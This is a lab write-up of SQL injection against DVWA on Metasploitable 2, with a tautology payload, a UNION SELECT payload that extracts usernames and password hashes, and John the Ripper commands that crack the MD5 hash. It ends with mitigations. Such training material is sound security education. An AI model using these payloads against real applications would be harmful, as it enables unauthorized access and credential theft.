
# 🔓 SQL Injection - DVWA (Metasploitable)

## 🎯 Objective
Exploit a SQL Injection vulnerability in DVWA to extract user credentials and gain unauthorized access.

---

## 🖥️ Target Information
- Application: DVWA (Damn Vulnerable Web Application)
- Environment: Metasploitable 2
- Port: 80 (HTTP)
- Vulnerability: SQL Injection
- Security Level: Low

---

## 🔍 Enumeration

The target machine was accessed via a web browser:

```
http://<TARGET_IP>/dvwa
```

While inspecting the page source, a hint was found:

```html
<p>username is 'admin' with password 'password'</p>
```

This indicates weak credential exposure in the application.

---

## 🔎 Vulnerability Analysis

The application does not sanitize user input properly, making it vulnerable to SQL Injection.

The backend query is likely structured as:

```sql
SELECT * FROM users WHERE id = '<input>';
```

This allows manipulation of the query logic.

---

## 💥 Exploitation

### 🔹 Authentication Bypass

The following payload was used:

```sql
1' OR '1'='1' -- 
```

This forces the query to always return true, allowing bypass of authentication.

---

### 🔹 Data Extraction (UNION-based SQLi)

A more advanced payload was used:

```sql
1' UNION SELECT user, password FROM users -- 
```

This allowed extraction of:
- usernames
- password hashes

---

## 🧪 Post-Exploitation

A password hash was obtained:

```
5f4dcc3b5aa765d61d8327deb882cf99
```

The hash was saved to a file:

```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
```

Then cracked using John the Ripper:

```bash
john --format=raw-md5 hash.txt
john --show hash.txt
```

The password was successfully recovered.

---

## 🔐 Impact

- Authentication bypass
- Exposure of user credentials
- Password cracking via weak hashing (MD5)
- Full access to application accounts

---

## 🛡️ Mitigation

- Use prepared statements (parameterized queries)
- Sanitize all user input
- Avoid exposing sensitive information in HTML
- Use strong hashing algorithms (e.g., bcrypt)
- Implement proper authentication controls

---

## 🧠 Lessons Learned

- SQL Injection can bypass authentication with simple payloads
- UNION-based SQLi allows data extraction from databases
- Weak hashing algorithms like MD5 are easily cracked
- Importance of inspecting source code for hidden information

---

## 📚 References

- OWASP SQL Injection
- DVWA Documentation
